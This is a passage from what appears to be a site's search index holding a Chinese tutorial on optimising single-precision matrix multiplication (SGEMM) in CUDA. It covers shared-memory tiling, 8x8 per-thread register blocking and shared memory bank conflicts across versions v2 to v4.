\u200b\u7684\u200b\u5927\u5c0f\u200b\u53d6\u51b3\u4e8e\u200b\u7528\u6237\u200b\u8f93\u5165\u200b\uff0c\u200b\u5b83\u200b\u53ef\u80fd\u200b\u5f88\u5927\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6ca1\u6cd5\u200b\u628a\u200b\u6574\u4e2a\u200b \\(32 * k\\) \u200b\u6216\u8005\u200b \\(k * 32\\) \u200b\u7684\u200b\u957f\u6761\u5f62\u200b\u77e9\u9635\u200b\u653e\u8fdb\u200b shared memory\u3002\u200b\u90a3\u200b\u5c31\u200b\u53ea\u53d6\u200b\u4e00\u90e8\u5206\u200b\uff1a\u200b\u5148\u200b\u4ece\u200b A \u200b\u77e9\u9635\u200b\u548c\u200b B \u200b\u77e9\u9635\u200b\u53d6\u200b \\(32 * 32\\) \u200b\u7684\u200b\u5b50\u200b\u77e9\u9635\u200b\u5230\u200b shared memory\uff0c\u200b\u8fdb\u884c\u200b\u4e00\u756a\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u518d\u53d6\u200b \\(32 * 32\\) \u200b\u7684\u200b\u5b50\u200b\u77e9\u9635\u200b\uff0c\u200b\u76f4\u5230\u200b\u6574\u4e2a\u200b \\(32 * k\\) \u200b\u548c\u200b \\(k * 32\\) \u200b\u53d6\u5b8c\u200b\u4e3a\u6b62\u200b\u3002</p> <p>\u200b\u90a3\u4e48\u200b\u5c31\u200b\u9700\u8981\u200b\u7528\u200b shared memory \u200b\u4fdd\u5b58\u200b\u4e24\u4e2a\u200b \\(32 * 32\\) \u200b\u7684\u200b\u77e9\u9635\u200b\uff1a</p> <pre><code>__shared__ float aTile[BLOCK_SIZE_PER_THREAD_BLOCK]\n                      [BLOCK_SIZE_PER_THREAD_BLOCK];\n__shared__ float bTile[BLOCK_SIZE_PER_THREAD_BLOCK]\n                      [BLOCK_SIZE_PER_THREAD_BLOCK];\n</code></pre> <p>\u200b\u63a5\u4e0b\u6765\u200b\u95ee\u9898\u200b\u6765\u200b\u4e86\u200b\uff0c\u200b\u600e\u4e48\u200b\u4ece\u200b A \u200b\u548c\u200b B \u200b\u77e9\u9635\u200b\u5206\u522b\u200b\u590d\u5236\u200b \\(32*32\\) \u200b\u4e2a\u200b\u5143\u7d20\u200b\uff1f\u200b\u6bcf\u4e2a\u200b thread block \u200b\u6b63\u597d\u200b\u6709\u200b \\(32*32\\) \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u6bcf\u4e2a\u200b\u7ebf\u7a0b\u200b\u8d1f\u8d23\u200b\u590d\u5236\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b\u3002\u200b\u6b63\u597d\u200b blockDim \u200b\u8bbe\u7f6e\u200b\u7684\u200b\u662f\u200b x \u200b\u548c\u200b y \u200b\u65b9\u5411\u200b\u4e0a\u200b\u5404\u200b 32 \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u6bcf\u4e2a\u200b\u7ebf\u7a0b\u200b\u8d1f\u8d23\u200b\u5199\u5165\u200b <code>aTile[threadIdx.x][threadIdx.y]</code> \u200b\u548c\u200b <code>bTile[threadIdx.x][threadIdx.y]</code>\u3002\u200b\u90a3\u4e48\u200b\u4ece\u200b A \u200b\u548c\u200b B \u200b\u77e9\u9635\u200b\u7684\u200b\u54ea\u91cc\u200b\u8bfb\u53d6\u6570\u636e\u200b\u5462\u200b\uff1f</p> <p>\u200b\u9996\u5148\u200b\u8003\u8651\u200b A \u200b\u77e9\u9635\u200b\uff0c\u200b\u7b2c\u4e00\u6b21\u200b\u8981\u53d6\u200b\u7684\u200b \\(32*32\\) \u200b\u77e9\u9635\u200b\uff0c\u200b\u5e94\u8be5\u200b\u662f\u200b\u5f53\u524d\u200b thread block \u200b\u5bf9\u5e94\u200b\u7684\u200b\u540c\u4e00\u200b\u884c\u91cc\u200b\uff0c\u200b\u6700\u200b\u5de6\u8fb9\u200b\u7684\u200b \\(32*32\\) \u200b\u77e9\u9635\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u77e9\u9635\u200b\u5de6\u4e0a\u89d2\u200b\u5143\u7d20\u200b\u7684\u200b\u4e0b\u6807\u200b\u5e94\u8be5\u200b\u662f\u200b \\(x=32 * blockIdx.x, y=0\\)\uff0c\u200b\u53f3\u4e0b\u89d2\u200b\u5143\u7d20\u200b\u7684\u200b\u4e0b\u6807\u200b\u5e94\u8be5\u200b\u662f\u200b \\(x=32 * blockIdx.x + 31, y=31\\)\u3002\u200b\u56e0\u6b64\u200b\u7b2c\u4e00\u6b21\u200b\u5faa\u73af\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7b2c\u4e00\u4e2a\u200b\u7ebf\u7a0b\u200b \\(threadIdx.x=0, threadIdx.y=0\\) \u200b\u5e94\u8be5\u200b\u4ece\u200b a \u200b\u77e9\u9635\u200b\u7684\u200b <code>a[32 * blockIdx.x][0]</code> \u200b\u8bfb\u53d6\u200b\uff0c\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u7ebf\u7a0b\u200b \\(threadIdx.x=15, threadIdx.y=15\\) \u200b\u5e94\u8be5\u200b\u4ece\u200b a \u200b\u77e9\u9635\u200b\u7684\u200b <code>a[32 * blockIdx.x + 15][15]</code> \u200b\u8bfb\u53d6\u200b\uff0c\u200b\u6b63\u597d\u200b\u6bcf\u4e2a\u200b\u7ebf\u7a0b\u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b a \u200b\u77e9\u9635\u7684\u5143\u200b\u7d20\u200b\uff0c\u200b\u53ea\u662f\u200b X \u200b\u65b9\u5411\u200b\u4e0a\u200b\u6574\u4f53\u200b\u504f\u79fb\u200b\u4e86\u200b \\(32 * blockIdx.x\\)\uff0c\u200b\u6240\u4ee5\u200b\uff1a</p> <pre><code>aTile[threadIdx.x][threadIdx.y] = a[IDX2C(32 * blockIdx.x + threadIdx.x, threadIdx.y, k)];\n</code></pre> <p>\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0cb \u200b\u77e9\u9635\u200b\u4f1a\u200b\u4ece\u200b y \u200b\u65b9\u5411\u200b\u4e0a\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u6574\u4f53\u200b\u504f\u79fb\u200b\u4e86\u200b \\(32 * blockIdx.y\\)\uff0c\u200b\u6240\u4ee5\u200b\uff1a</p> <pre><code>bTile[threadIdx.x][threadIdx.y] = b[IDX2C(threadIdx.x, 32 * blockIdx.y + threadIdx.y, n)];\n</code></pre> <p>\u200b\u8fd9\u662f\u200b\u7b2c\u4e00\u6b21\u200b\u5faa\u73af\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u4e0b\u200b\u4e00\u6b21\u200b\u5faa\u73af\u200b\uff0c\u200b\u4ece\u200b A \u200b\u77e9\u9635\u200b\u8bfb\u53d6\u200b\u65f6\u200b\uff0cy \u200b\u65b9\u5411\u200b\u8981\u200b\u79fb\u52a8\u200b 32 \u200b\u9879\u200b\uff1b\u200b\u4ece\u200b B \u200b\u77e9\u9635\u200b\u8bfb\u53d6\u200b\u65f6\u200b\uff0cx \u200b\u65b9\u5411\u200b\u8981\u200b\u79fb\u52a8\u200b 32 \u200b\u9879\u200b\uff0c\u200b\u628a\u200b\u8fd9\u4e2a\u200b\u504f\u79fb\u200b i \u200b\u653e\u8fdb\u6765\u200b\uff1a</p> <pre><code>int x = 32 * blockIdx.x + threadIdx.x;\nint y = 32 * blockIdx.y + threadIdx.y;\nfor (int i = 0; i &lt; k; i += BLOCK_SIZE_PER_THREAD_BLOCK) {\n    // 1. read data to aTile and bTile\n    // each thread is responsible to copy one element from global memory\n    aTile[threadIdx.x][threadIdx.y] = a[IDX2C(x, i + threadIdx.y, k)];\n    bTile[threadIdx.x][threadIdx.y] = b[IDX2C(i + threadIdx.x, y, n)];\n}\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u5b8c\u6210\u200b\u4e86\u200b \\(32*32\\) \u200b\u5b50\u200b\u77e9\u9635\u200b\u7684\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4f1a\u200b\u5faa\u73af\u200b\u76f4\u5230\u200b \\(32*k\\) \u200b\u6574\u4e2a\u200b\u957f\u6761\u5f62\u200b\u7684\u200b\u5b50\u200b\u77e9\u9635\u200b\u90fd\u200b\u8bfb\u53d6\u200b\u5b8c\u6210\u200b\u3002\u200b\u63a5\u4e0b\u6765\u200b\uff0c\u200b\u5c31\u662f\u200b\u8fb9\u8bfb\u200b\u8fb9\u7b97\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u628a\u200b\u539f\u6765\u200b\u4ece\u200b global memory \u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u6539\u6210\u200b\u4ece\u200b shared memory \u200b\u8bfb\u53d6\u6570\u636e\u200b\uff1a</p> <pre><code>__syncthreads();\nfor (int ii = i; ii &lt; k &amp;&amp; ii &lt; i + BLOCK_SIZE_PER_THREAD_BLOCK; ii++) {\n    // sum += a[x][i] * b[i][y];\n    sum += aTile[threadIdx.x][ii - i] * bTile[ii - i][threadIdx.y];\n}\n</code></pre> <p>\u200b\u6ce8\u610f\u200b\u5168\u5c40\u200b\u7684\u200b\u504f\u79fb\u200b\u548c\u200b shared memory \u200b\u4e2d\u200b\u504f\u79fb\u200b\u7684\u200b\u5173\u7cfb\u200b\u3002\u200b\u4e0d\u8981\u200b\u5fd8\u8bb0\u200b\u5728\u200b\u8bfb\u53d6\u200b shared memory \u200b\u548c\u200b\u8ba1\u7b97\u200b\u4e4b\u95f4\u200b\u63d2\u5165\u200b <code>__syncthreads()</code>\uff0c\u200b\u4fdd\u8bc1\u200b thread block \u200b\u4e2d\u200b\u6240\u6709\u200b\u7ebf\u7a0b\u200b\u5b8c\u6210\u200b\u5199\u5165\u200b\u3002</p> <p>\u200b\u8fd9\u4e2a\u200b\u7248\u672c\u200b\u4f9d\u7136\u200b\u662f\u200b\u6bcf\u4e2a\u200b\u7ebf\u7a0b\u200b\u8d1f\u8d23\u200b 1 \u200b\u4e2a\u200b C \u200b\u77e9\u9635\u7684\u5143\u200b\u7d20\u200b\uff0c\u200b\u56e0\u6b64\u200b\u6027\u80fd\u200b\u5e76\u200b\u6ca1\u6709\u200b\u4ec0\u4e48\u200b\u53d8\u5316\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e3a\u200b\u540e\u9762\u200b\u7684\u200b\u7248\u672c\u200b\u6253\u4e0b\u200b\u4e86\u200b\u57fa\u7840\u200b\u3002</p>"},{"location":"software/sgemm_cuda.html#sgemm-v3","title":"SGEMM v3","text":"<p>\u200b\u524d\u9762\u200b\u7684\u200b\u4e24\u4e2a\u200b\u7248\u672c\u200b\u6027\u80fd\u200b\u4e0d\u597d\u200b\uff0c\u200b\u662f\u56e0\u4e3a\u200b\u5927\u90e8\u5206\u200b\u65f6\u95f4\u200b\u90fd\u200b\u62ff\u6765\u200b\u8bfb\u53d6\u200b\u5185\u5b58\u200b\uff0c\u200b\u5b9e\u9645\u200b\u8ba1\u7b97\u200b\u7684\u200b\u65f6\u95f4\u200b\u5f88\u5c11\u200b\u3002\u200b\u5982\u679c\u200b\u8981\u200b\u589e\u52a0\u200b\u8ba1\u7b97\u200b\u7684\u200b\u6bd4\u4f8b\u200b\uff0c\u200b\u5c31\u200b\u9700\u8981\u200b\u628a\u200b\u66f4\u200b\u591a\u200b\u77e9\u9635\u7684\u5143\u200b\u7d20\u200b\u653e\u5728\u200b\u5bc4\u5b58\u5668\u200b\u4e2d\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u7248\u672c\u200b\u91cc\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u7ebf\u7a0b\u200b\u8d1f\u8d23\u200b \\(8*8\\) \u200b\u7684\u200b\u77e9\u9635\u200b\uff0c\u200b\u6bcf\u4e2a\u200b thread block \u200b\u7f29\u5c0f\u200b\u5230\u200b \\(16*16\\) \u200b\u4e2a\u200b thread\uff0c\u200b\u56e0\u4e3a\u200b\u6bcf\u4e2a\u200b\u7ebf\u7a0b\u200b\u8d1f\u8d23\u200b \\(8*8\\)\uff0c\u200b\u6240\u4ee5\u200b\u4e00\u4e2a\u200b thread block \u200b\u5c31\u200b\u8d1f\u8d23\u200b\u4e86\u200b \\(128*128\\) \u200b\u7684\u200b C \u200b\u77e9\u9635\u200b\u7684\u200b\u5b50\u200b\u77e9\u9635\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6309\u200b\u5982\u4e0b\u200b\u65b9\u6cd5\u200b\u8ba1\u7b97\u200b gridDim \u200b\u548c\u200b blockDim\uff1a</p> <pre><code>// each thread block handles 128*128 submatrix of C\n// each thread handles 8*8 submatrix of C\n//              n\n//\n//    +---------+---------+\n//    |         |         |\n//    | 128x128 | 128x128 |\n//    |         |         |\n// m  +---------+---------+\n//    |         |         |\n//    | 128x128 | 128x128 |\n//    |         |         |\n//    +---------+---------+\n//\n//              C\n#define BLOCK_SIZE_PER_THREAD_BLOCK 128\n#define BLOCK_SIZE_PER_THREAD 8\nblockDim.x = BLOCK_SIZE_PER_THREAD_BLOCK / BLOCK_SIZE_PER_THREAD;\nblockDim.y = BLOCK_SIZE_PER_THREAD_BLOCK / BLOCK_SIZE_PER_THREAD;\nblockDim.z = 1;\n\n// compute number of blocks\n// round up\ngridDim.x =\n    (m + (BLOCK_SIZE_PER_THREAD_BLOCK - 1)) / BLOCK_SIZE_PER_THREAD_BLOCK;\ngridDim.y =\n    (n + (BLOCK_SIZE_PER_THREAD_BLOCK - 1)) / BLOCK_SIZE_PER_THREAD_BLOCK;\ngridDim.z = 1;\n</code></pre> <p>\u200b\u6b64\u65f6\u200b\u5982\u679c\u200b\u60f3\u200b\u5982\u6cd5\u70ae\u5236\u200b v2\uff0c\u200b\u5728\u200b shared memory \u200b\u4e2d\u200b\u4fdd\u5b58\u200b \\(128*128\\) \u200b\u77e9\u9635\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4f1a\u200b\u53d1\u73b0\u200b CUDA \u200b\u62a5\u9519\u200b\uff0c\u200b\u8868\u793a\u200b\u6ca1\u6709\u200b\u8fd9\u4e48\u200b\u591a\u200b\u7684\u200b shared memory \u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u4e0d\u5f97\u4e0d\u200b\u5728\u200b K \u200b\u65b9\u5411\u200b\u4e0a\u200b\uff0c\u200b\u51cf\u5c11\u200b shared memory \u200b\u77e9\u9635\u200b\u7684\u200b\u89c4\u6a21\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u9009\u62e9\u200b\u7684\u200b\u662f\u200b \\(128*8\\)\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u4ece\u200b A \u200b\u77e9\u9635\u200b\u53d6\u51fa\u200b \\(128*8\\) \u200b\u7684\u200b\u5b50\u200b\u77e9\u9635\u200b\uff0c\u200b\u4ece\u200b B \u200b\u77e9\u9635\u200b\u53d6\u51fa\u200b \\(8*128\\) \u200b\u7684\u200b\u5b50\u200b\u77e9\u9635\u200b\uff0c\u200b\u4fdd\u5b58\u200b\u5728\u200b shared memory \u200b\u4e2d\u200b\uff1a</p> <pre><code>// 128x128 is too large to save in shared memory,\n// so we reduce k dimension to 8.\n// save 128x8 tile from A, 8x128 tile from B\n#define SHARED_K_DIMENSION 8\n__shared__ float aTile[BLOCK_SIZE_PER_THREAD_BLOCK][SHARED_K_DIMENSION];\n__shared__ float bTile[SHARED_K_DIMENSION][BLOCK_SIZE_PER_THREAD_BLOCK];\n</code></pre> <p>v2 \u200b\u7248\u672c\u200b\u4e2d\u200b\uff0c\u200b\u8bfb\u53d6\u6570\u636e\u200b\u5230\u200b shared memory \u200b\u6bd4\u8f83\u200b\u5bb9\u6613\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u6bcf\u4e2a\u200b\u7ebf\u7a0b\u200b\u53ea\u200b\u9700\u8981\u200b\u8d1f\u8d23\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b\u3002\u200b\u4f46\u200b\u5728\u200b v3 \u200b\u4e2d\u200b\uff0cshared memory \u200b\u8981\u200b\u4fdd\u5b58\u200b \\(128*8=1024\\) \u200b\u4e2a\u200b\u5143\u7d20\u200b\uff0c\u200b\u6bcf\u4e2a\u200b thread block \u200b\u53ea\u6709\u200b \\(16*16=256\\) \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\uff0c\u200b\u610f\u5473\u7740\u200b\u6bcf\u4e2a\u200b\u7ebf\u7a0b\u200b\u9700\u8981\u200b\u8d1f\u8d23\u200b 4 \u200b\u4e2a\u200b\u5143\u7d20\u200b\u7684\u200b\u8bfb\u53d6\u200b\u3002\u200b\u65e2\u7136\u5982\u6b64\u200b\uff0c\u200b\u5c31\u200b\u6309\u7167\u200b\u987a\u5e8f\u200b\uff0c\u200b\u7ed9\u200b\u6bcf\u4e2a\u200b\u7ebf\u7a0b\u200b\u5206\u914d\u200b\u56db\u4e2a\u200b\u8fde\u7eed\u200b\u7684\u200b\u5143\u7d20\u200b\uff1a</p> <p>\u200b\u7b2c\u4e00\u4e2a\u200b\u7ebf\u7a0b\u200b\u8d1f\u8d23\u200b <code>aTile[0][0..=3]</code>\uff0c\u200b\u7b2c\u4e8c\u4e2a\u200b\u7ebf\u7a0b\u200b\u8d1f\u8d23\u200b <code>aTile[0][4..=7]</code>\uff0c\u200b\u7b2c\u4e09\u4e2a\u200b\u7ebf\u7a0b\u200b\u8d1f\u8d23\u200b <code>aTile[1][0..=3]</code>\uff0c\u200b\u4f9d\u6b21\u200b\u7c7b\u63a8\u200b\uff0c\u200b\u5bfb\u627e\u200b\u89c4\u5f8b\u200b\uff1a</p> <pre><code>// thread (0, 0), tid=0: aTile[0][0..=3]\n// thread (0, 1), tid=1: aTile[0][4..=7]\n// thread (0, 2), tid=2: aTile[1][0..=3]\n// ...\n// thread (0, 15), tid=15: aTile[7][4..=7]\n// thread (1, 0), tid=16: aTile[8][0..=3]\n// ...\n// thread (15, 15), tid=255: aTile[127][4..=7]\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\uff0c\u200b\u9996\u5148\u200b\u628a\u200b <code>threadIdx.x</code> \u200b\u548c\u200b <code>threadIdx.y</code> \u200b\u5408\u5e76\u200b\u6210\u200b\u8fde\u7eed\u200b\u7684\u200b tid\uff1a<code>tid = threadIdx.x * 16 + threadIdx.y</code>\uff0c\u200b\u4e4b\u540e\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b aTile \u200b\u7684\u200b\u4e24\u4e2a\u200b\u7ef4\u5ea6\u200b\u7684\u200b\u8d77\u59cb\u200b\u4e0b\u6807\u200b\uff1a</p> <pre><code>int tid = threadIdx.x * 16 + threadIdx.y;\n// aTile[local_x][local_y..=(local_y+3)]\nint local_x = tid / 2;\nint local_y = 4 * (tid % 2);\n</code></pre> <p>\u200b\u63a5\u7740\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u5f53\u524d\u200b A \u200b\u5b50\u200b\u77e9\u9635\u200b\u7684\u200b\u8d77\u59cb\u200b\u4e0b\u6807\u200b\uff0c\u200b\u5c31\u200b\u50cf\u200b v2 \u200b\u4e2d\u200b\u90a3\u6837\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u6b64\u65f6\u200b\u6bcf\u4e2a\u200b block \u200b\u5bf9\u5e94\u200b\u7684\u200b\u662f\u200b 128 \u200b\u4e2a\u200b\u5143\u7d20\u200b\uff0c\u200b\u4e0d\u518d\u200b\u7b49\u4e8e\u200b blockDim.x\uff0ci \u200b\u7684\u200b\u542b\u4e49\u200b\u548c\u200b v2 \u200b\u4e00\u6837\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b K \u200b\u65b9\u5411\u200b\u4e0a\u200b\u7684\u200b\u504f\u79fb\u200b\uff1a</p> <pre><code>int block_x = BLOCK_SIZE_PER_THREAD_BLOCK * blockIdx.x;\nint block_y = i;\n</code></pre> <p>\u200b\u6700\u540e\u200b\u7528\u200b\u5faa\u73af\u200b\u4ece\u200b A \u200b\u590d\u5236\u200b\u56db\u4e2a\u200b\u5143\u7d20\u200b\u5230\u200b shared memory\uff1a</p> <pre><code>for (int j = 0; j &lt; 4; j++) {\n    aTile[local_x][local_y + j] =\n        a[IDX2C(block_x + local_x, block_y + local_y + j, k)];\n}\n</code></pre> <p>\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0c\u200b\u5faa\u73af\u200b\u4ece\u200b B \u200b\u590d\u5236\u200b\u56db\u4e2a\u200b\u5143\u7d20\u200b\u5230\u200b shared memory\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u8fd9\u6b21\u200b\u5b50\u200b\u77e9\u9635\u200b\u53d8\u6210\u200b\u4e86\u200b \\(128*8\\)\uff0c\u200b\u8ba1\u7b97\u516c\u5f0f\u200b\u7565\u6709\u4e0d\u540c\u200b\uff0c\u200b\u4f46\u200b\u5f88\u200b\u5bb9\u6613\u200b\u627e\u5230\u200b\u89c4\u5f8b\u200b\uff1a</p> <pre><code>// thread (0, 0), tid=0: bTile[0][0..=3]\n// thread (0, 1), tid=1: bTile[0][4..=7]\n// ...\n// thread (0, 15), tid=15: bTile[0][60..=63]\n// thread (1, 0), tid=16: bTile[0][64..=67]\n// ...\n// thread (1, 15), tid=31: bTile[0][124..=127]\n// ...\n// thread (15, 15), tid=255: bTile[7][124..=127]\nblock_x = i;\nblock_y = BLOCK_SIZE_PER_THREAD_BLOCK * blockIdx.y;\nlocal_x = tid / 32;\nlocal_y = 4 * (tid % 32);\nfor (int j = 0; j &lt; 4; j++) {\n    bTile[local_x][local_y + j] =\n        b[IDX2C(block_x + local_x, block_y + local_y + j, n)];\n}\n</code></pre> <p>\u200b\u5b8c\u6210\u200b\u8bfb\u53d6\u200b\u4ee5\u540e\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u7ebf\u7a0b\u200b\u8d1f\u8d23\u200b \\(8*8\\) \u200b\u77e9\u9635\u200b\u7684\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u591a\u52a0\u200b\u4e24\u5c42\u200b\u5faa\u73af\u200b\uff1a</p> <pre><code>// each thread handles 8x8 elements in C\nfloat sum[BLOCK_SIZE_PER_THREAD][BLOCK_SIZE_PER_THREAD] = {};\n\nfor (int i = 0; i &lt; k; i += SHARED_K_DIMENSION) {\n    // read aTile and bTile\n    // ...\n\n    __syncthreads();\n    for (int ii = i; ii &lt; k &amp;&amp; ii &lt; i + SHARED_K_DIMENSION; ii++) {\n        for (int xx = 0; xx &lt; BLOCK_SIZE_PER_THREAD; xx++) {\n            for (int yy = 0; yy &lt; BLOCK_SIZE_PER_THREAD; yy++) {\n                sum[xx][yy] +=\n                    aTile[threadIdx.x * BLOCK_SIZE_PER_THREAD + xx][ii - i] *\n                    bTile[ii - i][threadIdx.y * BLOCK_SIZE_PER_THREAD + yy];\n            }\n        }\n    }\n}\n</code></pre> <p>\u200b\u6700\u540e\u200b\u5199\u56de\u200b C \u200b\u77e9\u9635\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u6bcf\u4e2a\u200b\u7ebf\u7a0b\u200b\u8d1f\u8d23\u200b\u628a\u200b\u81ea\u5df1\u200b\u7684\u200b \\(8*8\\) \u200b\u77e9\u9635\u200b\u5199\u56de\u200b\u5185\u5b58\u200b\uff1a</p> <pre><code>for (int xx = 0; xx &lt; BLOCK_SIZE_PER_THREAD &amp;&amp; x + xx &lt; m; xx++) {\n    for (int yy = 0; yy &lt; BLOCK_SIZE_PER_THREAD &amp;&amp; y + yy &lt; n; yy++) {\n        c[IDX2C(x + xx, y + yy, n)] = sum[xx][yy];\n    }\n}\n</code></pre> <p>v3 \u200b\u7248\u672c\u200b\u76f8\u6bd4\u200b v2 \u200b\u548c\u200b v1 \u200b\u5c31\u200b\u6709\u200b\u4e86\u200b\u660e\u663e\u200b\u7684\u200b\u6027\u80fd\u200b\u63d0\u5347\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8bfb\u53d6\u6570\u636e\u200b\u5230\u200b shared memory \u200b\u4ee5\u540e\u200b\uff0c\u200b\u540e\u9762\u200b\u7684\u200b\u5927\u91cf\u200b\u8ba1\u7b97\u200b\u90fd\u200b\u5728\u200b\u5bc4\u5b58\u5668\u200b\u548c\u200b shared memory \u200b\u4e0a\u200b\u8fdb\u884c\u200b\uff0c\u200b\u5e76\u4e14\u200b\u7531\u4e8e\u200b \\(8*8\\) \u200b\u77e9\u9635\u200b\u4fdd\u5b58\u200b\u5728\u200b\u5bc4\u5b58\u5668\u200b\u4e2d\u200b\uff0c\u200b\u7f16\u8bd1\u200b\u540e\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u8fde\u7eed\u200b\u7684\u200b FMA \u200b\u6307\u4ee4\u200b\uff0c\u200b\u8fbe\u5230\u200b\u6bd4\u8f83\u200b\u9ad8\u200b\u7684\u200b\u6d6e\u70b9\u200b\u6027\u80fd\u200b\u3002NVCC \u200b\u7f16\u8bd1\u5668\u200b\u4e5f\u200b\u4f1a\u200b\u5bf9\u200b <code>sum[xx][yy]</code> \u200b\u8ba1\u7b97\u200b\u7684\u200b\u5916\u79ef\u200b\u8fdb\u884c\u200b\u4f18\u5316\u200b\uff0c\u200b\u5148\u200b\u4ece\u200b shared memory \u200b\u8bfb\u53d6\u200b aTile \u200b\u548c\u200b bTile \u200b\u7684\u200b\u5411\u91cf\u200b\uff0c\u200b\u7136\u540e\u200b\u8ba1\u7b97\u200b\u5916\u79ef\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u5916\u79ef\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u53ea\u4f1a\u200b\u6d89\u53ca\u200b\u5230\u200b\u5bc4\u5b58\u5668\u200b\u4e86\u200b\u3002</p>"},{"location":"software/sgemm_cuda.html#sgemm-v4","title":"SGEMM v4","text":"<p>v3 \u200b\u5b9e\u73b0\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u4e00\u4e2a\u200b\u6027\u80fd\u200b\u74f6\u9888\u200b\uff1aShared Memory Bank Conflict\u3002\u200b\u95ee\u9898\u200b\u51fa\u200b\u5728\u5916\u200b\u79ef\u200b\u7684\u200b\u5faa\u73af\u200b\u5f53\u4e2d\u200b\uff0c\u200b\u5b83\u200b\u5bf9\u200b aTile \u200b\u7684\u200b\u8bfb\u53d6\u200b\u662f\u200b\u4e0d\u200b\u8fde\u7eed\u200b\u7684\u200b\uff1a</p> <pre><code>for (int ii = i; ii &lt; k &amp;&amp; ii &lt; i + SHARED_K_DIMENSION; ii++) {\n    for (int xx = 0; xx &lt; BLOCK_SIZE_PER_THREAD; xx++) {\n        for (int yy = 0; yy &lt; BLOCK_SIZE_PER_THREAD; yy++) {\n            sum[xx][yy] +=\n                aTile[threadIdx.x * BLOCK_SIZE_PER_THREAD + xx][ii - i] *\n                bTile[ii - i][threadIdx.y * BLOCK_SIZE_PER_THREAD + yy];\n        }\n    }\n}\n</code></pre> <p>\u200b\u5728\u200b\u8ba1\u7b97\u200b <code>sum[xx][yy]</code> \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u540c\u4e00\u4e2a\u200b warp \u200b\u5185\u200b\u76f8\u90bb\u200b\u7ebf\u7a0b\u200b\u7684\u200b <code>threadIdx.x</code> \u200b\u4e0d\u540c\u200b\uff0c\u200b\u5b83\u4eec\u200b\u8bbf\u95ee\u200b aTile \u200b\u7684\u200b\u5730\u5740\u200b\u5dee\u200b\uff0c\u200b\u7b49\u4e8e\u200b <code>8(BLOCK_SIZE_PER_THREAD) * 8(SHARED_K_DIMENSION) * 4(sizeof(float)) = 256</code> \u200b\u5b57\u8282\u200b\uff0c\u200b\u800c\u200b Shared Memory \u200b\u7ec4\u7ec7\u200b\u65b9\u5f0f\u200b\u662f\u200b 32 \u200b\u4e2a\u200b Bank\uff0c\u200b\u6bcf\u4e2a\u200b Bank 32 \u200b\u4f4d\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u5982\u679c\u200b\u8bbf\u95ee\u200b 32 \u200b\u4f4d\u200b\u6570\u636e\u200b\u65f6\u200b\uff0c\u200b\u4e24\u6b21\u200b\u8bbf\u95ee\u200b\u7684\u200b\u5730\u5740\u200b\u5dee\u662f\u200b 128 \u200b\u5b57\u8282\u200b\u7684\u200b\u500d\u6570\u200b\uff0c\u200b\u4e24\u6b21\u200b\u8bbf\u95ee\u200b\u5c31\u200b\u7531\u200b\u540c\u4e00\u4e2a\u200b Bank \u200b\u8d1f\u8d23\u200b\uff0c\u200b\u800c\u200b\u5355\u4e2a\u200b Bank \u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\u53ea\u80fd\u200b\u4e32\u884c\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u51fa\u73b0\u200b\u4e86\u200b Shared Memory Bank Conflict\u3002bTile \u200b\u4e0d\u4f1a\u200b\u9047\u5230\u200b Bank Conflict \u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5982\u679c\u200b <code>threadIdx.y</code> 